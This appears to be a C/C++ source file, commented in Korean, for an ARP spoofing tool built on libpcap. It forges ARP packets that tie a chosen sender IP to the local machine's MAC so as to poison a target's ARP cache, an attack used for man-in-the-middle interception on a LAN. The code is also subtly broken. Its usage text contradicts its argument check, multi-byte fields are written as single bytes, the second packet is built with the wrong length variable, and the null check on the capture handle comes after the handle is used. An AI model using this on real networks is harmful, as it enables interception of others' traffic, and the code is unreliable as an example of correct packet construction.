#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <net/ethernet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/un.h>
#include <ifaddrs.h>
#include <net/if.h>
#include <netinet/in.h>
#define MAC_LEN 6
#define IP_LEN 4
#define Start_arp 14
typedef struct ether {
    u_char ETHER_D_MAC[MAC_LEN];
    u_char ETHER_S_MAC[MAC_LEN];
    u_int16_t ETHER_TYPE=0x0806;
} ether_hdr;

typedef struct arp {
    u_int16_t ARP_HARDWARE_TYPE=0x0001;
    u_int16_t ARP_PROTOCOL_TYPE=0x0800;
    u_int8_t ARP_HARDWARE_SIZE=0x06;
    u_int8_t ARP_PROTOCOL_SIZE=0x04;
    u_int16_t ARP_OPCODE=0x0001;
    u_int8_t ARP_S_MAC[MAC_LEN];
    u_int8_t ARP_S_IP[IP_LEN];
    u_int8_t ARP_T_MAC[MAC_LEN];
    u_int8_t ARP_T_IP[IP_LEN];
} arp_hdr;

void usage() {
  printf("syntax: pcap_test <interface>\n");
  printf("sample: pcap_test wlan0\n");
}

int main(int argc, char* argv[]) {
  if (argc != 4) {
    usage();
    return -1;
  }
  char* dev = argv[1];
  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  int size=0;
  int size1=0;

  //get mac
    int ifindex = 0; // 인덱스를 저장할 변수
    int i;
    u_char src_mac[6];
    u_char src_ip[4];   // 물리적 주소를 저장할 공간
    struct ifreq ifr; // ifreq 구조체를 생성한다.
    int sock = socket(AF_PACKET,SOCK_RAW,0); // 소켓을 만들어준다(파일 디스크립터)
    strncpy(ifr.ifr_name, argv[1],sizeof(argv[1])-1); // 원하는 인퍼페이스의 이름을 명시해준다.
     if(ioctl(sock,SIOCGIFINDEX, &ifr) == -1) // sock과 관련된 인터페이스의 인덱스 번호를 ifr에 넣어달라.
     {                                                   // 실패시 반환 -1
      perror("ioctl error[IFINDEX]");
      exit(-1);
     }
    ifindex = ifr.ifr_ifindex; // ifr 구조체에 저장되어있는 인덱스 번호를 변수에 저장한다.
    if(ioctl(sock,SIOCGIFHWADDR, &ifr) == -1) // sock과 관련된 물리적 주소를 ifr에 넣어달라
     {
      perror("Fail..ioctl error[IFHWADDR]");
      exit(-1);
     }
    for(i = 0 ; i < 6 ; i++)
        src_mac[i] = ifr.ifr_hwaddr.sa_data[i];  // ifr 구조체에 저장되어있는 물리적 주소를 저장한다.
    printf("[+] our Mac Addr :  %02X:%02X:%02X:%02X:%02X:%02X \n",src_mac[0],src_mac[1],src_mac[2],src_mac[3],src_mac[4],src_mac[5]);

   if(ioctl(sock,SIOCGIFADDR, &ifr) == -1) // sock과 관련된 물리적 주소를 ifr에 넣어달라
       {
         perror("Fail..ioctl error[IFADDR]");
         exit(-1);
        }
     for(i=0;i<4;i++)
         src_ip[i] = ifr.ifr_addr.sa_data[i+2];
     printf("[+] our Ip Addr : %d.%d.%d.%d \n",src_ip[0],src_ip[1],src_ip[2],src_ip[3]);
  u_char packet1[42];
  u_char packet2[42];

  ether_hdr Ethernet;
  arp_hdr Arpgo;

  for(int i=0;i<6;i++) {
      Ethernet.ETHER_D_MAC[i] = 0xff;
      packet1[i] = Ethernet.ETHER_D_MAC[i];
  }
  size +=6;
  for(int i=0;i<6;i++) {
      Ethernet.ETHER_S_MAC[i] = src_mac[i];
      packet1[size+i] = Ethernet.ETHER_S_MAC[i];
  }
  size+=6;
  packet1[size] = Ethernet.ETHER_TYPE;
  packet1[size+2] = Arpgo.ARP_HARDWARE_TYPE;
  packet1[size+4] = Arpgo.ARP_PROTOCOL_TYPE;
  packet1[size+6] = Arpgo.ARP_HARDWARE_SIZE;
  packet1[size+7] = Arpgo.ARP_PROTOCOL_SIZE;
  packet1[size+8] = Arpgo.ARP_OPCODE;

  size+=10;

  for(int i=0;i<6;i++) {
      Arpgo.ARP_S_MAC[i] = src_mac[i];
      packet1[size+i] = Arpgo.ARP_S_MAC[i];
  }

  size+=6;

  sscanf(argv[2], "%d.%d.%d.%d", &Arpgo.ARP_S_IP[0], &Arpgo.ARP_S_IP[1], &Arpgo.ARP_S_IP[2], &Arpgo.ARP_S_IP[3]);

  for(int i=0;i<4;i++) {
      packet1[size+i] = Arpgo.ARP_S_IP[i];
  }

  size+=4;

  for(int i=0;i<6;i++) {
      Arpgo.ARP_T_MAC[i] = 0x00;
      packet1[size+i] = Arpgo.ARP_T_MAC[i];
  }

  size+=6;

  sscanf(argv[3], "%d.%d.%d.%d",&Arpgo.ARP_T_IP[0],&Arpgo.ARP_T_IP[1],&Arpgo.ARP_T_IP[2],&Arpgo.ARP_T_IP[3]);

  for(int i=0;i<4;i++) {
      packet1[size+i] = Arpgo.ARP_T_IP[i];
  }

  size+=4;
  
  struct pcap_pkthdr *header;
  const u_char *replypacket;

  pcap_sendpacket(handle,packet1,size);
  pcap_next_ex(handle,&header,&replypacket);
  if(replypacket[22]==0x02) {
      for(int i=0;i<6;i++) {
          packet2[i] = replypacket[i+6];
      }
      size1 +=6;
      for(int i=0;i<6;i++) {
          packet2[size1+i] = src_mac[i];
      }
      size1+=6;
      packet2[size1] = Ethernet.ETHER_TYPE;
      packet2[size1+2] = Arpgo.ARP_HARDWARE_TYPE;
      packet2[size1+4] = Arpgo.ARP_PROTOCOL_TYPE;
      packet2[size1+6] = Arpgo.ARP_HARDWARE_SIZE;
      packet2[size1+7] = Arpgo.ARP_PROTOCOL_SIZE;
      packet2[size1+8] = Arpgo.ARP_OPCODE;

      size1+=10;

      for(int i=0;i<6;i++) {
          Arpgo.ARP_S_MAC[i] = src_mac[i];
          packet2[size+i] = Arpgo.ARP_S_MAC[i];
      }

      size1+=6;

      for(int i=0;i<4;i++) {
          packet2[size+i] = Arpgo.ARP_S_IP[i];
      }

      size1+=4;

      for(int i=0;i<6;i++) {
          packet2[i] = replypacket[i+6];
      }

      size1+=6;

      for(int i=0;i<4;i++) {
          packet2[size+i] = Arpgo.ARP_T_IP[i];
      }
      size1+=4;

      pcap_sendpacket(handle,packet2,size);
  }
  

  if (handle == nullptr) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }

  pcap_close(handle);
  return 0;
}
